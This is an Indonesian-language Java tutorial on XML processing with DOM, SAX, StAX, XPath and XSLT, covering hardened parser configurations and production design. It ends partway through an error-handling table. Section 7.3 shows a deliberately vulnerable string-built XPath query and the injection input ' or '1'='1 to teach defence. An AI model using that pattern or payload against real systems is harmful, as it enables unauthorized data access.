# Learn Java JSON/XML/SOAP/Connectors Enterprise Integration — Part 13

## XML Parsing Models: DOM, SAX, StAX, XPath, XSLT

> Seri: `learn-java-json-xml-soap-connectors-enterprise-integration`  
> Part: `013`  
> Topik: XML parsing models untuk Java 8 sampai Java 25  
> Fokus: DOM, SAX, StAX, XPath, XSLT, security, performance, streaming, transformation, dan production design

---

## 0. Posisi Part Ini Dalam Seri

Di Part 12 kita membangun fondasi XML sebagai **information set**, bukan sekadar teks dengan tag. Kita membahas namespace, QName, atribut vs elemen, entity, mixed content, encoding, dan alasan XML tetap hidup di enterprise integration.

Part 13 menjawab pertanyaan berikut:

> Setelah XML masuk ke aplikasi Java, model pemrosesan apa yang harus dipakai?

Pilihan utamanya:

1. **DOM** — bangun seluruh document tree di memory.
2. **SAX** — parser mendorong event ke handler.
3. **StAX** — aplikasi menarik event dari parser secara streaming.
4. **XPath** — query node/fragment dari tree XML.
5. **XSLT** — transformasi XML deklaratif.

Ini bukan sekadar pilihan API. Ini adalah pilihan **arsitektur boundary**:

- Apakah payload kecil atau besar?
- Apakah perlu random access?
- Apakah perlu validasi schema?
- Apakah perlu transformasi document-to-document?
- Apakah perlu parsing partial?
- Apakah input dipercaya?
- Apakah pipeline harus backpressure-friendly?
- Apakah service harus tahan XML bomb, XXE, SSRF, dan transform abuse?

Java menyediakan XML processing API di module `java.xml` pada Java modern. Module tersebut mencakup JAXP, StAX, SAX, DOM, XPath, dan XSLT API. Pada Java 8 API ini tersedia tanpa JPMS module declaration, sedangkan sejak Java 9 API ini berada dalam module `java.xml`.

---

## 1. Mental Model Besar: XML Processing Bukan Satu Hal

Banyak engineer memakai istilah “parse XML” terlalu umum. Padahal XML processing bisa berarti banyak hal:

```text
XML bytes/text
    |
    v
Character decoding
    |
    v
Lexical parsing
    |
    v
Namespace resolution
    |
    v
Entity handling
    |
    v
Validation? DTD/XSD?
    |
    v
Processing model:
      - Tree: DOM
      - Push events: SAX
      - Pull events: StAX
      - Query: XPath
      - Transform: XSLT
      - Bind to Java object: JAXB/Jakarta XML Binding, next parts
```

Part ini fokus pada model **pre-binding** dan **document transformation**. JAXB akan dibahas setelah fondasi parsing ini karena JAXB sendiri bergantung pada pemahaman XML tree, namespace, schema, dan secure parsing.

### 1.1 Satu XML, Banyak Representasi

XML yang sama bisa direpresentasikan sebagai:

#### Text representation

```xml
<order id="O-1001">
  <customer>Fajar</customer>
  <total currency="SGD">120.50</total>
</order>
```

#### DOM representation

```text
Document
└── Element order
    ├── Attribute id = O-1001
    ├── Text whitespace
    ├── Element customer
    │   └── Text Fajar
    ├── Text whitespace
    ├── Element total
    │   ├── Attribute currency = SGD
    │   └── Text 120.50
    └── Text whitespace
```

#### SAX/StAX event stream

```text
START_DOCUMENT
START_ELEMENT order
ATTRIBUTE id=O-1001
START_ELEMENT customer
CHARACTERS Fajar
END_ELEMENT customer
START_ELEMENT total
ATTRIBUTE currency=SGD
CHARACTERS 120.50
END_ELEMENT total
END_ELEMENT order
END_DOCUMENT
```

#### XPath addressable tree

```text
/order/@id
/order/customer/text()
/order/total/@currency
/order/total/text()
```

#### XSLT transformation input

```text
Source XML + stylesheet rules -> Result XML/HTML/text
```

Satu format, tetapi model mentalnya berbeda.

---

## 2. Decision Matrix: Kapan Pakai Apa?

| Kebutuhan | DOM | SAX | StAX | XPath | XSLT |
|---|---:|---:|---:|---:|---:|
| Payload kecil | Sangat cocok | Bisa | Bisa | Cocok jika ada DOM | Cocok |
| Payload sangat besar | Berisiko | Cocok | Sangat cocok | Tidak ideal tanpa streaming strategy | Bisa tetapi hati-hati |
| Random access ke node | Sangat cocok | Tidak | Tidak langsung | Sangat cocok | Melalui template matching |
| Partial extraction | Boros | Cocok | Sangat cocok | Bisa, tapi perlu tree | Bisa, tapi overkill |
| Stateful business parsing | Bisa | Sulit jika kompleks | Cocok | Tidak cocok | Tidak cocok |
| Transform XML ke XML/HTML/text | Manual | Manual | Manual | Query saja | Sangat cocok |
| Modify document in-place | Bisa | Tidak cocok | Tidak langsung | Query saja | Bisa via transform output |
| Low memory | Tidak | Ya | Ya | Tidak jika berbasis DOM | Tergantung processor |
| Simplicity untuk dokumen kecil | Tinggi | Sedang | Sedang | Tinggi | Sedang |
| Backpressure/pipeline | Rendah | Sedang | Tinggi | Rendah | Sedang |
| Security hardening wajib | Ya | Ya | Ya | Ya | Ya |

### 2.1 Rule of Thumb

Gunakan **DOM** jika:

- dokumen kecil/menengah,
- perlu random access,
- perlu modify node,
- struktur cukup kompleks tapi ukuran terkendali,
- debugging/readability lebih penting daripada memory footprint.

Gunakan **SAX** jika:

- payload besar,
- alur bisa diproses sebagai event searah,
- ingin callback push model,
- parsing logic sederhana atau sangat terkontrol.

Gunakan **StAX** jika:

- payload besar,
- ingin pull model,
- ingin parser bergerak sesuai kebutuhan aplikasi,
- ingin partial extraction,
- ingin pipeline yang lebih mudah dikomposisi daripada SAX.

Gunakan **XPath** jika:

- dokumen kecil/menengah,
- ingin query node tertentu,
- expression lebih jelas daripada traversal manual,
- namespace dikelola dengan benar.

Gunakan **XSLT** jika:

- transformasi XML-ke-XML/HTML/text adalah kebutuhan utama,
- mapping deklaratif lebih tepat daripada Java imperative code,
- contract transform perlu dipisahkan dari business code.

---

## 3. JAXP: Abstraction Layer Java Untuk XML Processing

JAXP adalah Java API for XML Processing. JAXP bukan satu parser. JAXP adalah façade/factory layer untuk membuat parser, transformer, XPath engine, schema validator, dan komponen XML lain.

Secara praktis, kita sering memakai kelas seperti:

```java
javax.xml.parsers.DocumentBuilderFactory
javax.xml.parsers.SAXParserFactory
javax.xml.stream.XMLInputFactory
javax.xml.transform.TransformerFactory
javax.xml.xpath.XPathFactory
javax.xml.validation.SchemaFactory
```

Pada Java SE package-nya tetap `javax.xml.*`, meskipun Jakarta EE package berubah dari `javax.*` ke `jakarta.*` untuk banyak enterprise API. Ini penting: **JAXP di Java SE bukan ikut berubah menjadi `jakarta.xml.parsers`**.

### 3.1 Factory Model

Banyak API XML Java dibuat melalui factory:

```text
Factory configuration
    |
    v
Factory creates parser/transformer/xpath
    |
    v
Parser processes XML input
```

Kenapa factory penting?

Karena XML processing tidak hanya “new parser”. Factory adalah tempat kita mengatur:

- namespace awareness,
- validation,
- DTD/external entity behavior,
- secure processing,
- schema access restrictions,
- implementation-specific features,
- performance/security limits.

Kesalahan umum di production: membuat parser default tanpa hardening.

---

## 4. DOM: Document Object Model

DOM membangun seluruh dokumen XML menjadi tree object di memory.

```text
Input XML
   |
   v
DocumentBuilder.parse(...)
   |
   v
org.w3c.dom.Document
   |
   v
Tree traversal / query / mutation
```

### 4.1 Karakter DOM

DOM cocok ketika kita ingin berpikir seperti ini:

> “Saya punya dokumen utuh. Saya ingin mencari node, membaca atribut, memodifikasi elemen, lalu mungkin menulis ulang dokumen.”

DOM memberi random access:

```java
Document doc = builder.parse(inputStream);
Element root = doc.getDocumentElement();
String id = root.getAttribute("id");
NodeList totals = root.getElementsByTagName("total");
```

Tetapi DOM membayar biaya:

- seluruh XML harus diparse dulu,
- seluruh tree hidup di heap,
- whitespace menjadi text node,
- namespace harus dipahami secara eksplisit,
- dokumen besar dapat menyebabkan memory pressure.

### 4.2 DOM Secure Factory Template

Contoh konfigurasi aman untuk dokumen yang tidak membutuhkan DTD/external entity:

```java
import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.io.InputStream;

public final class SecureDomParser {

    private SecureDomParser() {}

    public static Document parse(InputStream input)
            throws ParserConfigurationException, IOException, SAXException {

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        factory.setNamespaceAware(true);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        // Harden against XXE / external DTD access.
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Java 8u40+ / modern JAXP access restrictions.
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        DocumentBuilder builder = factory.newDocumentBuilder();
        builder.setEntityResolver((publicId, systemId) -> new org.xml.sax.InputSource(new java.io.StringReader("")));

        return builder.parse(input);
    }
}
```

Catatan:

1. Tidak semua parser/versi mendukung semua feature string.
2. Production wrapper sebaiknya menangani `ParserConfigurationException` pada startup, bukan diam-diam fallback insecure.
3. Jangan copy-paste tanpa test di target JDK/container.

### 4.3 DOM Namespace Trap

Kode ini sering salah:

```java
NodeList nodes = doc.getElementsByTagName("Order");
```

Jika XML memakai namespace:

```xml
<ord:Order xmlns:ord="urn:example:order">
  <ord:Id>O-1</ord:Id>
</ord:Order>
```

Maka nama lokal dan namespace URI harus dipahami:

```java
NodeList nodes = doc.getElementsByTagNameNS("urn:example:order", "Order");
```

Mental model:

```text
Prefix bukan identitas.
Namespace URI + local name adalah identitas.
```

Prefix `ord`, `o`, atau `x` bisa berbeda tetapi QName semantic tetap sama jika namespace URI sama.

### 4.4 Whitespace Trap

DOM melihat whitespace sebagai text node:

```xml
<order>
  <id>O-1</id>
</order>
```

Tree-nya bukan hanya:

```text
order -> id
```

Tetapi juga:

```text
order
  #text "\n  "
  id
  #text "\n"
```

Karena itu traversal naïve sering gagal:

```java
Node first = root.getFirstChild();
// Bisa jadi text whitespace, bukan element id.
```

Lebih aman:

```java
static Element firstChildElement(Element parent, String namespaceUri, String localName) {
    for (Node n = parent.getFirstChild(); n != null; n = n.getNextSibling()) {
        if (n.getNodeType() == Node.ELEMENT_NODE) {
            Element e = (Element) n;
            if (namespaceUri.equals(e.getNamespaceURI()) && localName.equals(e.getLocalName())) {
                return e;
            }
        }
    }
    throw new IllegalArgumentException("Missing element: {" + namespaceUri + "}" + localName);
}
```

### 4.5 DOM Mutation

DOM bisa memodifikasi document:

```java
Element status = doc.createElementNS("urn:example:order", "status");
status.setTextContent("APPROVED");
root.appendChild(status);
```

Lalu menulis ulang:

```java
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

TransformerFactory tf = TransformerFactory.newInstance();
tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

Transformer transformer = tf.newTransformer();
transformer.setOutputProperty(OutputKeys.INDENT, "yes");
transformer.transform(new DOMSource(doc), new StreamResult(outputStream));
```

### 4.6 Kapan DOM Berbahaya?

DOM berbahaya ketika:

- input tidak dibatasi ukurannya,
- payload bisa sangat besar,
- parser default menerima DTD/external entity,
- service high-throughput memparse XML sebagai tree per request,
- XPath expression berat dijalankan berkali-kali di tree besar,
- document disimpan sebagai `String` lalu parse lagi berkali-kali.

Production invariant:

```text
Tidak boleh ada DOM parse untuk unbounded XML input.
```

---

## 5. SAX: Simple API for XML

SAX adalah event-driven push parser.

```text
Parser controls flow
    |
    v
Calls handler methods:
      startDocument()
      startElement(...)
      characters(...)
      endElement(...)
      endDocument()
```

Aplikasi tidak menarik event. Parser yang mendorong event ke callback.

### 5.1 SAX Mental Model

SAX cocok jika kita ingin berpikir seperti ini:

> “Saya tidak perlu dokumen utuh. Saya hanya ingin bereaksi ketika parser melewati elemen tertentu.”

Contoh:

```xml
<orders>
  <order id="O-1"><total>10.00</total></order>
  <order id="O-2"><total>20.00</total></order>
</orders>
```

Kita bisa proses order satu per satu tanpa menyimpan seluruh tree.

### 5.2 SAX Handler Example

```java
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.XMLConstants;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.InputStream;
import java.math.BigDecimal;

public final class OrderTotalSaxParser {

    public static BigDecimal parseTotal(InputStream input) throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();
        factory.setNamespaceAware(true);
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        SAXParser parser = factory.newSAXParser();

        TotalHandler handler = new TotalHandler();
        parser.parse(input, handler);
        return handler.total;
    }

    private static final class TotalHandler extends DefaultHandler {
        private boolean insideTotal;
        private final StringBuilder text = new StringBuilder();
        private BigDecimal total = BigDecimal.ZERO;

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes) {
            if ("total".equals(localName)) {
                insideTotal = true;
                text.setLength(0);
            }
        }

        @Override
        public void characters(char[] ch, int start, int length) {
            // characters() may be called multiple times for one text node.
            if (insideTotal) {
                text.append(ch, start, length);
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) {
            if ("total".equals(localName)) {
                total = total.add(new BigDecimal(text.toString().trim()));
                insideTotal = false;
            }
        }
    }
}
```

### 5.3 Critical SAX Trap: `characters()` Bisa Terpecah

Banyak bug SAX terjadi karena engineer menganggap `characters()` dipanggil sekali untuk satu text node.

Salah:

```java
@Override
public void characters(char[] ch, int start, int length) {
    currentValue = new String(ch, start, length);
}
```

Benar:

```java
text.append(ch, start, length);
```

SAX tidak menjamin chunking text sesuai ekspektasi aplikasi. Parser boleh memecah text berdasarkan buffer internal, entity boundary, atau alasan lain.

### 5.4 SAX State Machine

SAX handler pada dasarnya adalah state machine.

```text
OUTSIDE_ORDER
    on <order> -> INSIDE_ORDER
INSIDE_ORDER
    on <total> -> INSIDE_TOTAL
INSIDE_TOTAL
    on text -> accumulate
    on </total> -> parse total, return INSIDE_ORDER
INSIDE_ORDER
    on </order> -> emit order, return OUTSIDE_ORDER
```

Jika dokumen kompleks, SAX handler bisa menjadi sulit dirawat karena state tersebar di banyak boolean.

Anti-pattern:

```java
boolean inA;
boolean inB;
boolean inC;
boolean inD;
String current;
```

Lebih baik pakai explicit stack:

```java
Deque<QName> path = new ArrayDeque<>();
```

Atau gunakan StAX jika logic perlu aplikasi mengendalikan alur.

### 5.5 Kapan SAX Cocok?

SAX cocok untuk:

- read-only scan,
- extract aggregate,
- ETL besar,
- validation event pipeline,
- high-throughput low-memory parsing,
- aplikasi lama yang sudah punya handler infrastructure.

SAX kurang cocok untuk:

- random access,
- transform kompleks,
- modify document,
- business flow yang perlu nested parsing dengan banyak branching,
- developer ergonomics tinggi.

---

## 6. StAX: Streaming API for XML

StAX adalah pull parser. Aplikasi mengontrol kapan maju ke event berikutnya.

```text
Application controls flow
    |
    v
while (reader.hasNext()) {
    int event = reader.next();
}
```

Oracle tutorial menekankan bahwa StAX menawarkan cursor API dan iterator API. Cursor API lebih efisien untuk low-level performance, sedangkan iterator API cocok untuk pipeline, event modification, dan pluggable event processing.

### 6.1 StAX Mental Model

StAX cocok jika kita ingin berpikir seperti ini:

> “Saya ingin membaca XML sebagai stream, tetapi saya ingin alur parsing dikendalikan oleh kode saya, bukan callback parser.”

Ini membuat StAX sering lebih nyaman daripada SAX untuk parsing business payload besar.

### 6.2 XMLStreamReader Example

```java
import javax.xml.XMLConstants;
import javax.xml.namespace.QName;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamConstants;
import javax.xml.stream.XMLStreamReader;
import java.io.InputStream;
import java.math.BigDecimal;

public final class OrderTotalStaxParser {

    private static final QName TOTAL = new QName("urn:example:order", "total");

    public static BigDecimal parseTotal(InputStream input) throws Exception {
        XMLInputFactory factory = XMLInputFactory.newFactory();

        factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");

        XMLStreamReader reader = factory.createXMLStreamReader(input);

        BigDecimal total = BigDecimal.ZERO;

        try {
            while (reader.hasNext()) {
                int event = reader.next();

                if (event == XMLStreamConstants.START_ELEMENT) {
                    QName name = reader.getName();
                    if (TOTAL.equals(name)) {
                        String text = reader.getElementText();
                        total = total.add(new BigDecimal(text.trim()));
                    }
                }
            }
            return total;
        } finally {
            reader.close();
        }
    }
}
```

### 6.3 StAX Cursor API vs Event Iterator API

StAX punya dua gaya utama:

#### Cursor API

```java
XMLStreamReader reader = factory.createXMLStreamReader(input);
```

Karakter:

- lebih low-level,
- allocation lebih rendah,
- event diakses dari cursor saat ini,
- cocok untuk performance-sensitive parser.

#### Event Iterator API

```java
XMLEventReader reader = factory.createXMLEventReader(input);
XMLEvent event = reader.nextEvent();
```

Karakter:

- event object lebih eksplisit,
- lebih mudah dikomposisi,
- cocok untuk pipeline/filter,
- allocation lebih tinggi.

### 6.4 StAX Partial Extraction

Misalnya XML besar:

```xml
<batch>
  <header>...</header>
  <orders>
    <order id="O-1">...</order>
    <order id="O-2">...</order>
  </orders>
  <audit>...</audit>
</batch>
```

Kita hanya ingin order:

```java
while (reader.hasNext()) {
    int event = reader.next();
    if (event == XMLStreamConstants.START_ELEMENT
            && "order".equals(reader.getLocalName())) {
        Order order = readOrder(reader);
        consumer.accept(order);
    }
}
```

Dengan fungsi:

```java
private static Order readOrder(XMLStreamReader reader) throws Exception {
    // Precondition: cursor is at START_ELEMENT <order>
    String id = reader.getAttributeValue(null, "id");
    BigDecimal total = null;

    while (reader.hasNext()) {
        int event = reader.next();

        if (event == XMLStreamConstants.START_ELEMENT) {
            switch (reader.getLocalName()) {
                case "total" -> total = new BigDecimal(reader.getElementText().trim());
                default -> skipElement(reader);
            }
        } else if (event == XMLStreamConstants.END_ELEMENT
                && "order".equals(reader.getLocalName())) {
            return new Order(id, total);
        }
    }

    throw new IllegalStateException("Unexpected end of XML while reading order");
}
```

Skip unknown subtree:

```java
private static void skipElement(XMLStreamReader reader) throws Exception {
    // Precondition: cursor is at START_ELEMENT of element to skip.
    int depth = 1;
    while (reader.hasNext() && depth > 0) {
        int event = reader.next();
        if (event == XMLStreamConstants.START_ELEMENT) {
            depth++;
        } else if (event == XMLStreamConstants.END_ELEMENT) {
            depth--;
        }
    }
}
```

### 6.5 StAX as Boundary Parser

StAX sangat cocok untuk boundary design seperti:

```text
HTTP/SFTP/MQ input stream
    |
    v
StAX hardened parser
    |
    v
Per-record extraction
    |
    v
Validation / normalization
    |
    v
Domain command / staging table / queue
```

Manfaat:

- tidak perlu load semua XML,
- bisa reject lebih awal,
- bisa emit record satu per satu,
- bisa integrasi dengan batch checkpoint,
- bisa mengontrol maximum records, depth, text length.

### 6.6 StAX Trap: `getElementText()` Bukan Untuk Elemen Kompleks

`getElementText()` cocok untuk elemen text-only:

```xml
<total>120.50</total>
```

Tidak cocok untuk:

```xml
<total>
  <amount>120.50</amount>
</total>
```

Jika dipakai pada elemen yang mengandung nested element, parser dapat error karena method tersebut mengharapkan text content sederhana.

---

## 7. XPath: Query XML Tree

XPath adalah bahasa ekspresi untuk memilih node dari XML document.

Contoh:

```xpath
/order/customer/name/text()
/order/items/item[@type='BOOK']
/order/total/@currency
```

Di Java, XPath umumnya dipakai bersama DOM:

```text
Input XML -> DOM Document -> XPath expression -> Node/NodeList/String/Boolean/Number
```

### 7.1 XPath Example

```java
import org.w3c.dom.Document;
import org.w3c.dom.Node;

import javax.xml.namespace.NamespaceContext;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;
import java.util.Iterator;

public final class XPathExample {

    public static String readOrderId(Document doc) throws Exception {
        XPath xpath = XPathFactory.newInstance().newXPath();
        xpath.setNamespaceContext(new NamespaceContext() {
            @Override
            public String getNamespaceURI(String prefix) {
                return switch (prefix) {
                    case "ord" -> "urn:example:order";
                    default -> javax.xml.XMLConstants.NULL_NS_URI;
                };
            }

            @Override
            public String getPrefix(String namespaceURI) {
                throw new UnsupportedOperationException();
            }

            @Override
            public Iterator<String> getPrefixes(String namespaceURI) {
                throw new UnsupportedOperationException();
            }
        });

        Node node = (Node) xpath.evaluate(
                "/ord:order/ord:id/text()",
                doc,
                XPathConstants.NODE
        );

        return node == null ? null : node.getNodeValue();
    }
}
```

### 7.2 XPath Namespace Trap

XPath expression ini salah untuk XML bernamespace:

```xpath
/order/id/text()
```

Jika XML-nya:

```xml
<order xmlns="urn:example:order">
  <id>O-1</id>
</order>
```

Maka elemen `order` dan `id` berada di namespace `urn:example:order`. XPath perlu prefix meskipun XML memakai default namespace:

```xpath
/ord:order/ord:id/text()
```

Prefix di XPath adalah alias lokal dalam evaluator, bukan harus sama dengan prefix di dokumen.

### 7.3 XPath Injection

Jika expression dibangun dari input user:

```java
String expr = "/users/user[name='" + username + "']/role/text()";
```

Input seperti ini dapat mengubah makna expression:

```text
' or '1'='1
```

Lebih aman:

- jangan jadikan XPath sebagai query language untuk user input mentah,
- gunakan variable resolver jika memungkinkan,
- validasi input secara allowlist,
- lakukan traversal manual untuk kasus sederhana,
- batasi ekspresi yang boleh dieksekusi.

### 7.4 XPath Performance

XPath nyaman tetapi bukan magic. Risiko:

- expression `//item` scan seluruh tree,
- XPath di-loop untuk setiap item bisa O(n²),
- DOM besar memperbesar biaya memory,
- namespace context salah menghasilkan query kosong silent.

Anti-pattern:

```java
for (int i = 0; i < 10000; i++) {
    xpath.evaluate("//item[@id='" + ids[i] + "']", doc);
}
```

Lebih baik:

- parse sekali,
- select node list sekali,
- build map di Java,
- atau gunakan streaming parser jika dokumen besar.

---

## 8. XSLT: Declarative XML Transformation

XSLT adalah bahasa transformasi XML.

```text
Source XML + XSLT stylesheet -> Result XML/HTML/text
```

Contoh stylesheet sederhana:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ord="urn:example:order">

  <xsl:output method="xml" indent="yes"/>

  <xsl:template match="/ord:order">
    <summary>
      <id><xsl:value-of select="ord:id"/></id>
      <amount><xsl:value-of select="ord:total"/></amount>
    </summary>
  </xsl:template>

</xsl:stylesheet>
```

Java usage:

```java
import javax.xml.XMLConstants;
import javax.xml.transform.Source;
import javax.xml.transform.Templates;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;

public final class XsltTransform {

    public static void transform(Source xml, Source xslt, StreamResult result) throws Exception {
        TransformerFactory factory = TransformerFactory.newInstance();
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

        Templates templates = factory.newTemplates(xslt);
        Transformer transformer = templates.newTransformer();
        transformer.transform(xml, result);
    }
}
```

### 8.1 `Transformer` vs `Templates`

`Templates` adalah compiled stylesheet yang bisa digunakan ulang.

```text
XSLT source
   |
   v
Templates compiled once
   |
   v
Transformer per transformation
```

Praktik baik:

- compile XSLT menjadi `Templates` saat startup,
- cache `Templates`,
- buat `Transformer` baru per request/job,
- jangan share mutable `Transformer` antar thread.

### 8.2 Kapan XSLT Lebih Baik Dari Java Code?

XSLT cocok ketika:

- output adalah XML/HTML/text,
- transformasi declarative dan rule-based,
- mapping perlu dikelola oleh integration team,
- contract transform berubah lebih sering daripada business logic,
- transform bisa dites dengan input/output fixture.

Java code lebih cocok ketika:

- transformasi sangat business-rule-heavy,
- perlu akses service/database,
- perlu error handling domain kaya,
- output bukan XML-like,
- perlu observability per business decision.

### 8.3 XSLT Security Trap

XSLT bisa berbahaya jika stylesheet tidak dipercaya:

- bisa mencoba membaca external DTD/stylesheet,
- bisa memakai extension function tergantung processor,
- bisa menyebabkan transform mahal/DoS,
- bisa membuka SSRF/file access jika external access tidak dibatasi.

Production invariant:

```text
Untrusted XSLT must not be executed with default TransformerFactory configuration.
```

Lebih aman:

- hanya allow trusted stylesheet,
- set secure processing,
- set `ACCESS_EXTERNAL_DTD` dan `ACCESS_EXTERNAL_STYLESHEET` ke kosong,
- disable extension functions jika processor mendukung,
- timeout/batasi ukuran input/output,
- cache stylesheet yang sudah direview.

---

## 9. Secure Processing: Apa Yang Harus Diharden?

XML security bukan hanya XXE. Kategori risiko:

1. **External entity resolution** — baca file lokal/SSRF.
2. **DTD/entity expansion** — billion laughs / exponential expansion.
3. **External schema/stylesheet access** — SSRF/file access saat validation/transform.
4. **XInclude** — memasukkan resource eksternal.
5. **Deep nesting** — stack/memory abuse.
6. **Huge text node** — memory abuse.
7. **XPath injection** — expression manipulation.
8. **XSLT extension abuse** — processor-dependent capability.
9. **Schema poisoning** — external import/include tidak dikontrol.
10. **Logging injection** — XML content masuk log/audit tanpa sanitization.

Oracle JAXP Security Guide menekankan penggunaan secure processing features dan properties untuk melindungi aplikasi dari serangan XML-related. OWASP XXE Prevention Cheat Sheet juga memberikan panduan hardening parser Java seperti `DocumentBuilderFactory`, `SAXParserFactory`, dan parser lain.

### 9.1 Minimal Hardening Policy

Untuk kebanyakan service yang menerima XML dari luar:

```text
DTD disabled
External general entities disabled
External parameter entities disabled
External DTD loading disabled
XInclude disabled
External schema access disabled unless explicit allowlist
External stylesheet access disabled unless explicit allowlist
Secure processing enabled
Input size/depth/text limits enforced
Timeout enforced at transport/job layer
```

### 9.2 Hardening Bukan Sekadar Feature Flag

Feature flag parser tidak cukup jika:

- XML sudah diparse oleh framework sebelum masuk kode kita,
- JAXB unmarshaller menerima `InputStream` langsung dengan default parser,
- SOAP stack memproses envelope sebelum handler security,
- XSLT stylesheet di-load dari URL eksternal,
- schema imports mengambil dependency dari internet,
- parser implementation berbeda antara local dan app server.

Karena itu boundary integration harus punya kebijakan:

```text
All XML entry points must have explicit parser policy.
```

---

## 10. Performance Model

### 10.1 DOM Performance Model

DOM cost:

```text
O(input size) parse
+ O(document tree objects) heap
+ random access convenience
```

DOM bisa 5x–20x lebih besar dari ukuran XML mentah tergantung struktur, whitespace, jumlah node, dan JVM/object overhead. Angka pasti tergantung implementasi, tetapi mental modelnya jelas: DOM bukan representasi compact.

### 10.2 SAX/StAX Performance Model

Streaming parser cost:

```text
O(input size) parse
+ O(current state) memory
```

Memory bisa jauh lebih kecil karena tidak menyimpan seluruh tree.

Namun streaming bukan otomatis cepat jika:

- handler membuat object terlalu banyak,
- text besar tetap diaccumulate,
- setiap event melakukan regex mahal,
- setiap record langsung call database satu per satu,
- logging dilakukan per event.

### 10.3 XPath Performance Model

XPath biasanya membutuhkan tree. Cost:

```text
DOM parse + XPath expression evaluation
```

XPath expression yang luas seperti `//` bisa mahal.

### 10.4 XSLT Performance Model

XSLT cost:

```text
Compile stylesheet + transform source -> result
```

Karena compile stylesheet mahal, gunakan `Templates` untuk reuse.

---

## 11. Production Architecture Patterns

### 11.1 Pattern: Small Trusted Configuration XML

Use case:

- internal config,
- small file,
- trusted deploy artifact,
- perlu random access.

Pilihan:

```text
DOM + XPath
```

Tetap harden parser karena trusted assumption bisa berubah.

### 11.2 Pattern: Large Partner Batch XML

Use case:

- file ribuan/jutaan record,
- partner upload via SFTP,
- harus proses record-by-record,
- ada checkpoint/retry.

Pilihan:

```text
StAX -> record DTO -> validation -> staging -> domain processing
```

Tambahkan:

- max file size,
- max record count,
- per-record error collection,
- dead-letter file/report,
- correlation id,
- schema validation strategy,
- idempotency key.

### 11.3 Pattern: Legacy Message Broker XML

Use case:

- XML message dari MQ,
- ukuran sedang,
- high-throughput,
- butuh extract few fields untuk routing.

Pilihan:

```text
StAX partial extraction for routing
Optional JAXB binding only for selected message type
```

Jangan DOM parse semua message hanya untuk membaca `messageType`.

### 11.4 Pattern: Document Transformation Gateway

Use case:

- XML dari agency A perlu diubah ke format agency B,
- mapping relatif declarative,
- banyak field rename/restructure.

Pilihan:

```text
XSLT with reviewed/cached stylesheet
+ fixture-based regression test
+ secure TransformerFactory
```

### 11.5 Pattern: SOAP Envelope Inspection

Use case:

- perlu baca SOAP header untuk correlation/routing,
- payload besar,
- tidak ingin bind body penuh.

Pilihan:

```text
StAX/SAAJ depending stack requirement
```

Untuk SOAP stack penuh, JAX-WS/SAAJ akan dibahas di part SOAP.

---

## 12. XML Validation Placement

Walaupun XSD dibahas mendalam di Part 14, parsing model harus tahu lokasi validasi.

Ada beberapa strategi:

### 12.1 Validate Before Processing

```text
Input XML -> XSD validation -> parse/bind/process
```

Kelebihan:

- reject invalid document awal,
- downstream lebih sederhana,
- partner contract enforcement jelas.

Kekurangan:

- biaya tambahan,
- validasi seluruh dokumen bisa mahal,
- error reporting kadang terlalu teknis,
- schema dependency harus dikelola aman.

### 12.2 Validate During Parsing

```text
SAX/StAX + schema-aware validation pipeline
```

Cocok untuk dokumen besar, tetapi implementasi lebih kompleks.

### 12.3 Validate At Boundary DTO

```text
Parse selected fields -> DTO -> Bean Validation/domain validation
```

Cocok jika:

- tidak semua XML diperlukan,
- partner schema terlalu longgar,
- domain punya constraint lebih kuat.

Best practice enterprise biasanya kombinasi:

```text
Structural validation at XML boundary
Semantic validation at domain boundary
```

---

## 13. Error Handling Model

XML parsing error bukan satu kategori.

| Error | Contoh | Respons |
|---|---|---|
| Encoding error | bytes bukan UTF-8 valid | reject file/request |
| Well-formedness error | tag tidak tertutup | reject sebagai invalid XML |
